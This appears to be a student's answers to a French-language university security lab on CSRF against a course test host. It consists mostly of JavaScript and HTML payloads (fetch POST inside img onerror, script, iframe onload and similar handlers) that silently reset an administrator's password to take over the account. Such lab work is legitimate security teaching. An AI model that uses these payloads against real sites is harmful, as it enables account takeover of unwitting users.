# Lab 1

## CSRF Simple

### 1. Quelle fonctionnalité du site, potentiellement vulnérable à une faille CSRF, pourriez-vous exploiter pour voler le compte administrateur ?


```javascript

fetch("http://basic.csrf.slh.cyfr.ch/profile/nathan.rayburn", {
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
  "body": "password=test1234",
  "method": "POST",
});
```


### 2. Proposez une requête qui vous permettra de prendre le contrôle du compte admin, si elle était exécutée par l’administrateur

   
### 3. Ecrivez une payload javascript qui exécute la requête.

```html
<img src="invalid.jpg" onerror="
  fetch('http://basic.csrf.slh.cyfr.ch/profile/nathan.rayburn_admin', {
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'password=test',
    method: 'POST'
  });
">

<script type="text/javascript">
  fetch('http://basic.csrf.slh.cyfr.ch/profile/nathan.rayburn_admin', {
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'password=test',
    method: 'POST'
  });
</script>

<a href="javascript:fetch('http://basic.csrf.slh.cyfr.ch/profile/nathan.rayburn_admin', {
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'password=test',
  method: 'POST'
});">
  Click here
</a>

<textarea oninput="
  fetch('http://basic.csrf.slh.cyfr.ch/profile/nathan.rayburn_admin', {
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'password=test',
    method: 'POST'
  });
"></textarea>

<input type="hidden" value="hidden value" onload="
  fetch('http://basic.csrf.slh.cyfr.ch/profile/nathan.rayburn_admin', {
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'password=test',
    method: 'POST'
  });
">

<iframe src="about:blank" onload="
  fetch('http://basic.csrf.slh.cyfr.ch/profile/nathan.rayburn_admin', {
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'password=test',
    method: 'POST'
  });
"></iframe>

<img src="invalid.jpg" onerror="
  fetch('http://basic.csrf.slh.cyfr.ch/profile/nathan.rayburn_admin', {
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'password=test',
    method: 'POST'
  });
">


```


### 4. Quelle fonctionnalité du site, potentiellement vulnérable à une faille Stored XSS, pourriez-vous exploiter pour faire exécuter votre payload
